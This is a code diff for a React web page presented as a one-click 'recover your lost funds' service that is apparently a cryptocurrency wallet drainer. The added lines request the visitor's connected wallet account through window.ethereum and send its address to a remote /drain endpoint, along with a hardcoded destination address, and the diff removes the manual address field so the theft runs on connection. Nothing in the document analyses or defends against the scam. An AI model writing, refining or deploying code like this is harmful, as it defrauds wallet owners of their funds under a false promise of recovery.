@@ -2,8 +2,6 @@ import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
 const App = () => {
-  const [address, setAddress] = useState("");
-  const [drainTo, setDrainTo] = useState("0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4"); // Replace with your drain address
   const [response, setResponse] = useState(null);
   const [loading, setLoading] = useState(false);
 
@@ -12,12 +10,21 @@ const App = () => {
     setResponse(null);
 
     try {
+      // Check if MetaMask or any wallet is connected
+      if (!window.ethereum) {
+        throw new Error("No wallet detected. Please install MetaMask or a compatible wallet.");
+      }
+
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      const address = accounts[0];
+
+      // Send the request to your backend to drain the wallet
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ address, drainTo }),
+        body: JSON.stringify({ address, drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4" }),
       });
 
       const data = await res.json();
@@ -25,7 +32,10 @@ const App = () => {
       setLoading(false);
     } catch (err) {
       console.error(err);
-      setResponse({ error: "Failed to drain wallet. Please try again." });
+      setResponse({
+        error: "Failed to drain wallet. Please try again.",
+        message: err.message,
+      });
       setLoading(false);
     }
   };
@@ -37,17 +47,6 @@ const App = () => {
         <p className="text-lg mb-8">
           Recover your lost funds in one click. Connect your wallet now.
         </p>
-
-        <div className="mb-4">
-          <label className="block text-gray-300 mb-2">Wallet Address</label>
-          <input
-            type="text"
-            value={address}
-            onChange={(e) => setAddress(e.target.value)}
-            className="w-full p-2 rounded bg-gray-700 text-white"
-            placeholder="Enter your wallet address"
-          />
-        </div>
 
         <button
           onClick={drainWallet}
